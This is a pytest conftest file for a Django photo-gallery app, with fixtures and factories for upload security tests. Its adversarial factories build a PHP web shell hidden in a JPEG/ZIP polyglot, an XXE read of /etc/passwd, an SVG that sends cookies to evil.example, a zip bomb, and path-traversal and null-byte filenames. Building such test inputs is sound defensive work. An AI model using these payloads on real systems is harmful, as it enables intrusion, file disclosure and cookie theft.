"""
tests/conftest.py — Shared fixtures for the PhotoBox top-level test suite.

Architecture note (post-refactor):
  - Uploads go via Fast Lane (POST /api/gallery/fast-lane/photos/)
    or Heavy Lane (POST /api/v1/ingestion/bulk/).
  - Cloudinary is a FETCH PROXY only — never called at upload time.
    The `gallery.services` module no longer exists.
  - Photo.status uses UPPERCASE choices: PENDING, READY, QUARANTINED, FAILED.
  - The CDN URL field on Photo is `optimized_url` (not `image_url`).
"""

import io
import os
import struct
import tempfile
import time
import uuid
import logging
import zlib
import zipfile
from pathlib import Path

import factory
import pytest
from factory.django import DjangoModelFactory
from PIL import Image as PILImage
from rest_framework.test import APIClient
from rest_framework_simplejwt.tokens import RefreshToken

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────
# Test runs can execute against a bind-mounted /app tree that is not writable
# to the unprivileged container user, so generated artifacts live under /tmp.
FIXTURES_DIR = Path(
    os.environ.get(
        "PHOTOBOX_TEST_FIXTURES_DIR",
        str(Path(tempfile.gettempdir()) / "photobox_fixtures"),
    )
)
FIXTURES_DIR.mkdir(parents=True, exist_ok=True)

TEST_CLOUDINARY_FOLDER = "test-automated"
STAGING_BASE_URL = os.environ.get("STAGING_BASE_URL", "http://localhost:8000")
CLOUDFLARE_WORKER_URL = os.environ.get(
    "CLOUDFLARE_WORKER_URL", "https://your-worker.your-account.workers.dev"
)

# ─────────────────────────────────────────────────────────────────────────────
# FIELD NAME CONSTANTS
# Must match the actual Photo model definition in gallery/models.py.
# Photo.optimized_url is the CDN delivery URL set by Cloudinary post-processing.
# ─────────────────────────────────────────────────────────────────────────────
PHOTO_CDN_URL_FIELD = "optimized_url"


# ─────────────────────────────────────────────────────────────────────────────
# IMAGE FACTORIES
# ─────────────────────────────────────────────────────────────────────────────

def make_image_file(
    width: int = 1920,
    height: int = 1080,
    fmt: str = "JPEG",
    color: tuple = (120, 80, 60),
    filename: str = "test_photo.jpg",
) -> io.BytesIO:
    """Generate a real in-memory image. Not a mock — a real JPEG/PNG."""
    img = PILImage.new("RGB", (width, height), color=color)
    buf = io.BytesIO()
    img.save(buf, format=fmt)
    buf.seek(0)
    buf.name = filename
    return buf


def make_large_image_file(mb: int = 8) -> io.BytesIO:
    """Generate a real ~N-MB JPEG to stress-test upload limits."""
    side = int((mb * 1024 * 1024 / 3) ** 0.5)
    return make_image_file(width=side, height=side, filename=f"large_{mb}mb.jpg")


# ─────────────────────────────────────────────────────────────────────────────
# ADVERSARIAL FILE FACTORIES (SECURITY)
# ─────────────────────────────────────────────────────────────────────────────

def make_polyglot_jpeg_zip() -> io.BytesIO:
    jpeg_buf = make_image_file()
    jpeg_bytes = jpeg_buf.read()

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr("shell.php", "<?php system($_GET['cmd']); ?>")
    zip_bytes = zip_buf.getvalue()

    combined = io.BytesIO(jpeg_bytes + zip_bytes)
    combined.name = "photo.jpg"
    return combined


def make_svg_xxe() -> io.BytesIO:
    payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>"""
    buf = io.BytesIO(payload)
    buf.name = "image.svg"
    return buf


def make_svg_xss() -> io.BytesIO:
    payload = b"""<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.example/'+document.cookie)">
  <circle r="50" cx="50" cy="50" fill="red"/>
</svg>"""
    buf = io.BytesIO(payload)
    buf.name = "image.svg"
    return buf


def make_zip_bomb(layers: int = 3) -> io.BytesIO:
    data = b"A" * (1024 * 1024)  # 1 MB seed
    for _ in range(layers):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("bomb.bin", data)
        data = buf.getvalue()
    outer = io.BytesIO(data)
    outer.name = "photo.jpg"
    return outer


def make_path_traversal_filename(payload: str = "../../../etc/cron.d/backdoor") -> io.BytesIO:
    buf = make_image_file()
    buf.name = payload
    return buf


def make_null_byte_filename() -> io.BytesIO:
    buf = make_image_file()
    buf.name = "photo\x00.php.jpg"
    return buf


def make_overlong_filename(length: int = 4096) -> io.BytesIO:
    buf = make_image_file()
    buf.name = "A" * length + ".jpg"
    return buf


def make_jpeg_with_embedded_php() -> io.BytesIO:
    jpeg = make_image_file()
    raw = jpeg.read()
    php_comment = b"\xFF\xFE" + struct.pack(">H", 22) + b"<?php phpinfo(); ?> "
    injected = raw[:2] + php_comment + raw[2:]
    buf = io.BytesIO(injected)
    buf.name = "photo.jpg"
    return buf


def make_tiff_file() -> io.BytesIO:
    img = PILImage.new("RGB", (100, 100), color=(50, 100, 150))
    buf = io.BytesIO()
    img.save(buf, format="TIFF")
    buf.seek(0)
    buf.name = "photo.tiff"
    return buf


def make_gif_with_script() -> io.BytesIO:
    gif = (
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
        b"!\xf9\x04\x00\x00\x00\x00\x00"
        b"!\xfe\x1a<script>alert(1)</script>\x00"
        b",\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
    )
    buf = io.BytesIO(gif)
    buf.name = "image.gif"
    return buf


# ─────────────────────────────────────────────────────────────────────────────
# MODEL FACTORIES — Database Fixtures
#
# ARCHITECTURE NOTE:
#   Photo.status uses UPPERCASE choices: PENDING, PROCESSING, READY, FAILED,
#   QUARANTINED, EXPIRED. The old "processed" / "pending" (lowercase) values
#   do not exist in STATUS_CHOICES and will fail DB constraint validation.
#
#   SceneFactory requires event= which requires workspace= which requires user=.
#   Tests that use factories directly must ensure the full hierarchy exists.
# ─────────────────────────────────────────────────────────────────────────────

class UserFactory(DjangoModelFactory):
    class Meta:
        model = "core.User"

    email = factory.Sequence(lambda n: f"factory_user_{n}@photostudio.test")
    name = factory.Sequence(lambda n: f"Factory User {n}")
    accepted_terms = True
    password = factory.PostGenerationMethodCall("set_password", "StrongTestPass!99")


class WorkspaceFactory(DjangoModelFactory):
    class Meta:
        model = "core.Workspace"

    class Params:
        owner = None

    user = factory.LazyAttribute(lambda obj: obj.owner or UserFactory())
    business_name = factory.Sequence(lambda n: f"Factory Workspace {n}")


class EventFactory(DjangoModelFactory):
    class Meta:
        model = "gallery.Event"

    class Params:
        owner = None

    workspace = factory.SubFactory(
        WorkspaceFactory,
        owner=factory.SelfAttribute("..owner"),
    )
    title = factory.Sequence(lambda n: f"Automated Test Event {n}")
    slug = factory.Sequence(lambda n: f"automated-test-event-{n}")
    event_type = "OTHER"


class SceneFactory(DjangoModelFactory):
    class Meta:
        model = "gallery.Scene"

    class Params:
        owner = None

    event = factory.SubFactory(
        EventFactory,
        owner=factory.SelfAttribute("..owner"),
    )
    id = factory.LazyFunction(uuid.uuid4)
    title = factory.Sequence(lambda n: f"Automated Test Scene {n}")
    display_order = factory.Sequence(int)


class PhotoFactory(DjangoModelFactory):
    class Meta:
        model = "gallery.Photo"

    class Params:
        owner = None

    id = factory.LazyFunction(uuid.uuid4)
    scene = factory.SubFactory(
        SceneFactory,
        owner=factory.SelfAttribute("..owner"),
    )
    file_size_bytes = factory.Faker("random_int", min=10_240, max=10_485_760)
    # Status must match Photo.STATUS_CHOICES — PENDING is the initial state
    status = "PENDING"
    original_filename = factory.Sequence(lambda n: f"photo_{n:04d}.jpg")


class ProcessedPhotoFactory(PhotoFactory):
    """A photo that has completed the full PENDING → READY pipeline."""
    status = "READY"
    is_processed = True
    file_size_bytes = factory.Faker("random_int", min=512_000, max=5_242_880)

    @classmethod
    def _create(cls, model_class, *args, **kwargs):
        """Inject the CDN URL field (optimized_url) with a plausible Cloudinary URL."""
        kwargs.setdefault(
            PHOTO_CDN_URL_FIELD,
            f"https://res.cloudinary.com/demo/image/upload/v1/{uuid.uuid4().hex}.jpg",
        )
        return super()._create(model_class, *args, **kwargs)


# ─────────────────────────────────────────────────────────────────────────────
# PYTEST FIXTURES
# ─────────────────────────────────────────────────────────────────────────────

@pytest.fixture
def api_client() -> APIClient:
    return APIClient()


@pytest.fixture
def photographer_user(db):
    from django.contrib.auth import get_user_model
    User = get_user_model()
    return User.objects.create_user(
        email=f"test_{uuid.uuid4().hex[:6]}@photostudio.test",
        password="StrongTestPass!99",
    )


@pytest.fixture
def second_photographer_user(db):
    from django.contrib.auth import get_user_model
    User = get_user_model()
    return User.objects.create_user(
        email=f"other_{uuid.uuid4().hex[:6]}@photostudio.test",
        password="AnotherStrongPass!77",
    )


@pytest.fixture
def authenticated_client(api_client, photographer_user) -> APIClient:
    refresh = RefreshToken.for_user(photographer_user)
    api_client.credentials(HTTP_AUTHORIZATION=f"Bearer {str(refresh.access_token)}")
    return api_client


@pytest.fixture
def second_authenticated_client(second_photographer_user) -> APIClient:
    client = APIClient()
    refresh = RefreshToken.for_user(second_photographer_user)
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {str(refresh.access_token)}")
    return client


@pytest.fixture
def test_image() -> io.BytesIO:
    return make_image_file()


@pytest.fixture
def large_test_image() -> io.BytesIO:
    return make_large_image_file(mb=8)


@pytest.fixture
def png_test_image() -> io.BytesIO:
    return make_image_file(fmt="PNG", filename="test_photo.png")


# ─────────────────────────────────────────────────────────────────────────────
# CLOUDINARY FIXTURES
# ─────────────────────────────────────────────────────────────────────────────

@pytest.fixture(scope="session")
def configure_cloudinary():
    required = ["CLOUDINARY_CLOUD_NAME", "CLOUDINARY_API_KEY", "CLOUDINARY_API_SECRET"]
    missing = [k for k in required if not os.environ.get(k)]
    if missing:
        pytest.skip(f"Cloudinary credentials not set: {missing}")

    import cloudinary
    cloudinary.config(
        cloud_name=os.environ["CLOUDINARY_CLOUD_NAME"],
        api_key=os.environ["CLOUDINARY_API_KEY"],
        api_secret=os.environ["CLOUDINARY_API_SECRET"],
        secure=True,
    )


@pytest.fixture
def cloudinary_cleanup(configure_cloudinary):
    import cloudinary.uploader
    created_ids: list[str] = []

    def register(public_id: str):
        created_ids.append(public_id)

    yield register

    for public_id in created_ids:
        try:
            cloudinary.uploader.destroy(public_id)
            logger.debug("Cloudinary cleanup: deleted %s", public_id)
        except Exception as exc:
            logger.warning("Cloudinary cleanup failed for %s: %s", public_id, exc)


# ─────────────────────────────────────────────────────────────────────────────
# CELERY FIXTURES
# ─────────────────────────────────────────────────────────────────────────────

@pytest.fixture(scope="session")
def celery_config():
    return {
        "task_always_eager": True,
        "task_eager_propagates": True,
        "broker_url": "memory://",
        "result_backend": "cache+memory://",
    }


@pytest.fixture
def live_celery_config():
    return {
        "broker_url": os.environ.get("CELERY_BROKER_URL", "redis://redis:6379/0"),
        "result_backend": os.environ.get("CELERY_RESULT_BACKEND", "redis://redis:6379/0"),
        "task_always_eager": False,
    }


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def wait_for_condition(
    condition_fn,
    timeout: float = 30.0,
    poll_interval: float = 1.0,
    description: str = "condition",
):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        result = condition_fn()
        if result:
            return result
        time.sleep(poll_interval)
    raise TimeoutError(f"Timed out waiting for: {description}")
